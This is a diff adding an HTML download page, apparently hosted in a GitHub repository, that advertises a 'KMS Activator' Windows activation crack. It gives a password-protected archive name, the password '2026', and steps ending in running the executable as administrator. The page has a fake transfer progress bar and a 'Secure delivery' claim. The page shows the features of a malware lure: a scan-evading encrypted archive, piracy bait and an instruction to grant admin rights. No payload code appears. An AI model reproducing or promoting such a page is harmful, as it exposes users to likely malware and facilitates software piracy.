@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="repo-name" id="repoNameMeta" content="">
+  <title>Quick Start Guide • KMServer 15</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="styles.css">
+  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' rx='24' fill='%230d1117'/%3E%3Ccircle cx='50' cy='50' r='28' fill='%233fb950'/%3E%3Cpath d='M38 50l8 8 16-16' stroke='%230d1117' stroke-width='4' stroke-linecap='round' fill='none'/%3E%3C/svg%3E" type="image/svg+xml">
+</head>
+<body>
+  <main class="main">
+    <div class="dashboard">
+      <div class="window-bar">
+        <div class="path-indicator">
+          <i class="fas fa-terminal"></i> ~/KMServer 15/setup
+        </div>
+        <div class="repo-header">
+          <i class="fab fa-github"></i>
+          <span class="repo-name-text" id="cardRepoName">repository</span>
+          <span class="badge-pub">public</span>
+        </div>
+      </div>
+
+      <div class="content">
+        <div class="transfer-panel">
+          <div class="progress-header">
+            <span><i class="fas fa-cloud-download-alt"></i> DOWNLOAD STATE</span>
+            <span id="progressPercentLabel">0%</span>
+          </div>
+          <div class="progress-track">
+            <div class="progress-fill" id="progressFill"></div>
+          </div>
+          <div class="status-message">
+            <span id="statusText">Initializing transfer node...</span>
+          </div>
+        </div>
+
+        <div class="action-row">
+          <div id="downloadWrapper" class="btn-wrapper">
+            <button class="btn btn-primary" id="downloadBtn">
+              <i class="fas fa-download"></i> Download KMS Activator
+            </button>
+          </div>
+          <div id="instructionWrapper" class="btn-wrapper">
+            <button class="btn btn-secondary" id="instructionBtn">
+              <i class="fas fa-book-open"></i> Instructions
+            </button>
+          </div>
+        </div>
+
+        <div class="password-row">
+          <div class="pass-label">
+            <i class="fas fa-key"></i> Archive password
+            <span class="pass-key">2026</span>
+          </div>
+          <button class="copy-mini" id="copyPasswordBtn"><i class="fas fa-copy"></i> copy</button>
+        </div>
+
+        <div class="specs">
+          <div class="spec-row">
+            <div class="spec-label"><i class="fas fa-tag"></i> Version</div>
+            <div class="spec-value">Latest [June, 2026]</div>
+          </div>
+          <div class="spec-row">
+            <div class="spec-label"><i class="fas fa-file-archive"></i> Archive</div>
+            <div class="spec-value">ActivApp.Mid_June_Update.rar</div>
+          </div>
+          <div class="spec-row">
+            <div class="spec-label"><i class="fab fa-windows"></i> Platform</div>
+            <div class="spec-value">Windows 7 / 8 / 10 / 11 (x86 & x64)</div>
+          </div>
+          <div class="spec-row">
+            <div class="spec-label"><i class="fas fa-hdd"></i> Size</div>
+            <div class="spec-value">≈ 36.5 MB</div>
+          </div>
+          <div class="spec-row">
+            <div class="spec-label"><i class="fas fa-microchip"></i> Requirements</div>
+            <div class="spec-value">2 GB RAM • 50 MB space • Internet</div>
+          </div>
+        </div>
+
+        <div class="footer-note">
+          <i class="fas fa-lock"></i> Secure delivery • KMServer 15 2026
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <div id="instructionModal" class="modal-overlay">
+    <div class="modal-window">
+      <div class="modal-head">
+        <h3><i class="fas fa-cog"></i> Setup guide</h3>
+        <button class="modal-close" id="closeModalBtn">&times;</button>
+      </div>
+      <div class="modal-body">
+        <div class="step">
+          <div class="step-num">1</div>
+          <div class="step-text"><p>Extract <strong>ActivApp.Mid_June_Update.rar</strong> using WinRAR or 7-Zip.</p></div>
+        </div>
+        <div class="step">
+          <div class="step-num">2</div>
+          <div class="step-text"><p>Use password: <code>2026</code> when prompted.</p></div>
+        </div>
+        <div class="step">
+          <div class="step-num">3</div>
+          <div class="step-text"><p>Right-click the executable → <strong>Run as administrator</strong>.</p></div>
+        </div>
+        <div class="step">
+          <div class="step-num">4</div>
+          <div class="step-text"><p>Follow setup wizard — installation completes in seconds.</p></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
